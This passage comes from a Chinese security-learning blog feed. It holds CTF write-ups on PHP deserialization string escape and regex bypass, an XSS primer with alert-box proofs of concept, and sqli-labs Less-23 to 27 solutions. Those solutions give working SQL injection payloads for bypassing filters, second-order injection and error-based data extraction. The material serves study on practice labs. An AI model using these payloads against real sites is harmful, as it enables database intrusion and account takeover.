function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;\0\0\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>对比可以发现，通过read函数后，<code>s:6:&quot;*&quot;</code>这段很明显是错误的，他包含到的是<code>s:6:&quot;*&quot;;s</code>，并且没有双引号闭合，如果要反序列化肯定是不行的（这里双引号里包含的是三个字符，浏览器显示问题看不到）。所以如果把一个特殊的的值赋值给password，然后通过read方法吞掉部分字符，就能达到字符串逃逸的效果<br>所以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;a&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>提前计算要逃逸的字符数<code>&quot;;s:8:&quot;password&quot;;s:73:&quot;a</code>为23，由于23不能和3整除，所以添加一个字符a<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;b=a<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span>B<span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>对于涉及字符串逃逸的题还是有点懵，总是做着做着就忘记要干嘛了</p><h3 id="NISACTF-2022-babyserialize"><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h3><h3 id="反序列化绕过正则"><a href="#反序列化绕过正则" class="headerlink" title="反序列化绕过正则"></a>反序列化绕过正则</h3><h4 id="preg-match-‘-O-d-‘"><a href="#preg-match-‘-O-d-‘" class="headerlink" title="preg_match(‘&#x2F;^O:\d+&#x2F;‘)"></a>preg_match(‘&#x2F;^O:\d+&#x2F;‘)</h4><p> 绕过方法1：利用加号来绕过过滤，因为数字1其实完整的写法是+1，所以这里我们就是在O后面这个数字前面加一个+</p><p>绕过方法2：在加号不能使用的情况下，我们可以使用数组绕过，在序列化的时候加上array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EXP</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> AAA));</span><br><span class="line"> </span><br><span class="line"><span class="comment">//实例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:3:&quot;AAA&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;&#125;&#125;&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a[]=&#x27;flag.php&#x27;;</span><br><span class="line">     </span><br><span class="line">$a=array(&#x27;flag.php&#x27;);</span><br><span class="line">     </span><br><span class="line">$a=[&#x27;flag.php&#x27;];</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xss漏洞</title>
      <link href="/xss%E6%BC%8F%E6%B4%9E.html"/>
      <url>/xss%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本（Cross-Site Scripting），本应该缩写为CSS，但是该缩写已被层叠样式脚本Cascading Style Sheets所用，所以改简称为XSS。也称跨站脚本或跨站脚本攻击。跨站脚本攻击XSS通过将恶意的Script代码注入到Web页面中，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><h1 id="攻击对象"><a href="#攻击对象" class="headerlink" title="攻击对象"></a>攻击对象</h1><p>用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然后浏览器不会判断代码是否恶意，也就是说xss的对象是用户的浏览器</p><h1 id="一般的攻击过程："><a href="#一般的攻击过程：" class="headerlink" title="一般的攻击过程："></a>一般的攻击过程：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击者将恶意代码注入到服务器中（如论坛、留言板、邮件等）；</span><br><span class="line">用户在没有防备的情况下访问了被注入了恶意代码的服务器；</span><br><span class="line">服务器将含有恶意代码的网页响应给客户端；</span><br><span class="line">在客户端浏览器中触发JS恶意代码。</span><br></pre></td></tr></table></figure><p>只要没有对用户的输入进行严格过滤，就会被xss。当攻击者可以将恶意代码注入到服务器中，我们就认为其存在xss漏洞。</p><h1 id="XSS漏洞危害"><a href="#XSS漏洞危害" class="headerlink" title="XSS漏洞危害"></a>XSS漏洞危害</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">恶意用户利用xss代码攻击成功后，可能会得到很高的权限</span><br><span class="line">（1）盗取各种用户账号；</span><br><span class="line">（2）窃取用户Cookie资料，冒充用户身份进入网站；</span><br><span class="line">（3）劫持用户会话，执行任意操作；是指操作用户浏览器；</span><br><span class="line">（4）刷流量，执行弹窗广告；</span><br><span class="line">（5）传播蠕虫病毒。</span><br></pre></td></tr></table></figure><h1 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h1><p>反射型XSS、存储型XSS和DOM型XSS</p><h1 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h1><p>定义：反射型XSS是非持久性、参数型跨站脚本。反射型XSS的JS代码在web应用的参数（变量）中，如搜索框的反射型XSS。<br>特点：这种攻击方式往往具有一次性<br>攻击方式：攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后，就会触发xss漏洞。</p><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p>定义：存储型XSS是持久性跨站脚本，持久性体现在xss代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。存储型XSS通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。<br>特点：攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。<br>攻击方式：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中 。 当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行 。所以需要浏览器从服务器载入恶意的xss代码，才能真正触发xss。</p><h1 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h1><h2 id="节点树模型"><a href="#节点树模型" class="headerlink" title="节点树模型"></a>节点树模型</h2><p>DOM全称Document Object Model，中文为文档对象模型，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式 。<br>HTML 的标签都是节点，而这些节点组成了 DOM 的整体结构一一节点树。通过HTML DOM，树中的所有节点均可通过JavaScript进行访问 。 所有HTML元素（节点）均可被修改，也可以创建或删除节点 。</p><p>DOM型XSS比较特殊，其中攻击的payload由于修改受害者浏览器页面的DOM树而执行的。其特殊的地方就是payload在浏览器本地修改DOM树而执行，并不会传到服务器上，这也就使得DOM型XSS比较难以检测。<br>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。 当用户的浏览器处理这个响应时， DOM对象就会处理XSS代码，导致存在XSS漏洞 。</p><h1 id="漏洞验证相关概念"><a href="#漏洞验证相关概念" class="headerlink" title="漏洞验证相关概念"></a>漏洞验证相关概念</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POC：全称 ’ Proof of Concept &#x27;，中文 ’ 概念验证 ’ ，常指一段漏洞验证的代码。</span><br><span class="line">EXP：全称 ’ Exploit &#x27;，中文 ’ 利用 &#x27;，指利用系统漏洞进行攻击的工具，即从漏洞检测验证到利用的工具。</span><br><span class="line">Payload：中文 ’ 有效载荷 &#x27;，指成功exploit之后，真正在目标系统执行的代码或指令。</span><br><span class="line">Shellcode：简单翻译 ’ shell代码 &#x27;，利用漏洞时所执行的代码，是Payload的一种。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。</span><br></pre></td></tr></table></figure><p>常见的用于验证XSS漏洞存在的POC如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;    /</span>/弹框最常用</span><br><span class="line">&lt;script&gt;<span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;<span class="regexp">/script&gt;  /</span>/弹出确认框</span><br><span class="line">&lt;script&gt;<span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;<span class="regexp">/script&gt;   /</span>/弹出输入框</span><br></pre></td></tr></table></figure><p>本文采用：<a href="https://blog.csdn.net/m0_64378913/article/details/124654153">https://blog.csdn.net/m0_64378913/article/details/124654153</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab-Less-23</title>
      <link href="/sqli-lab-Less-23.html"/>
      <url>/sqli-lab-Less-23.html</url>
      
        <content type="html"><![CDATA[<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>preg_replace($reg, $replace, $id)大概意思是如果id传参中有$reg的值则将其代替为$replaced的值<br>在这里是将#和–+替代为空，即注释被过滤<br>我们可以使用<br><code>and &#39;1&#39;=&#39;1</code><br>因为id是单引号闭合的<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code><br>接下来的很简单了，可以使用联合注入、报错注入、布尔盲注、时间盲注</p><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入</p><h4 id="第一步：插入恶意数据"><a href="#第一步：插入恶意数据" class="headerlink" title="第一步：插入恶意数据"></a>第一步：插入恶意数据</h4><p>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p><h4 id="第二步：引用恶意数据"><a href="#第二步：引用恶意数据" class="headerlink" title="第二步：引用恶意数据"></a>第二步：引用恶意数据</h4><p>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。<br>配合下图可以有更好的理解：</p><h3 id="mysql-real-escape-string-—-转义-SQL-语句中使用的字符串中的特殊字符"><a href="#mysql-real-escape-string-—-转义-SQL-语句中使用的字符串中的特殊字符" class="headerlink" title="mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符"></a>mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符</h3><p>可以预防sql注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span></span><br></pre></td></tr></table></figure><p>可以看出只有username没有受到保护，所以我们注册受污染的用户名和正常的密码<br>当注册成功后账户密码存在到数据库的时候是没有转义的，以原本数据存入数据库的。当我们修改密码的时候，对于账户名是没有进行过滤的。<br>注册用户名：admin’# 密码：123123 ，修改密码为：123456<br>然后以管理员admin，密码123456登录成功<br>这一题好像有bug吧</p><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>and和or被过滤。，而且or&#x2F;i中的i表示此函数不区分大小写，所以AND和OR也被抹掉<br>那我们可以使用||和&amp;&amp;进行一个代替，但是&amp;&amp;在URL栏中有别的意思代表多个传参的意思，所以我们要进行一个URL编码<br>&amp;&amp;即为%26%26，如果理解没错的话||不需要编码，但是在information_schema中不能使用||来代替or，它们只是逻辑上相同<br>这个时候我们就得用双写法，即将information写成infoorrmation，函数只会抹去一个or，这一波我们在第二层<br><code>Less-25/?id=-1&#39;union select 1,2,table_name from infoorrmation_schema.tables where table_schema=&#39;security&#39;--+</code><br>在此之前的order别忘了双写<br>接下来使用联合注入就行了</p><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>这一题更恶心，过滤了许多字符<br>我们看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个blacklist不就是黑名单的意思吗<br><code>\S 匹配任何非空白字符</code><br>这里我们可以给一些地方添加括号来规避空格，使用双写来代替and和or，这里使用空格的URL编码好像不行<br>举个例子</p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p><code>||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1))||&#39;0</code><br><img src="/img/51.png"><br>||可以用%7C%7C来替代</p><h2 id="黑名单和白名单"><a href="#黑名单和白名单" class="headerlink" title="黑名单和白名单"></a>黑名单和白名单</h2><p>黑名单是不允许输什么，白名单是只允许输什么</p><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关又过滤了一些东西</p><h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p><code>?id=1&#39;and(updatexml(1,concat(0x5e,database()),1)) and &#39;1&#39;=&#39;1</code></p><h3 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h3><p><code>?id=1&#39;and%0aupdatexml(1,concat(0x5e,(selEct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#39;security&#39;%0alimit%0a0,1)),1)and &#39;1&#39;=&#39;1</code></p><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p><code>?id=1&#39;and%0aupdatexml(1,concat(0x5e,(selEct%0acolumn_name%0afrom%0ainformation_schema.columns%0awhere%0atable_schema=&#39;security&#39;and%0atable_name=&#39;users&#39;%0alimit%0a0,1)),1)and &#39;1&#39;=&#39;1</code></p><h3 id="爆数据"><a href="#爆数据" 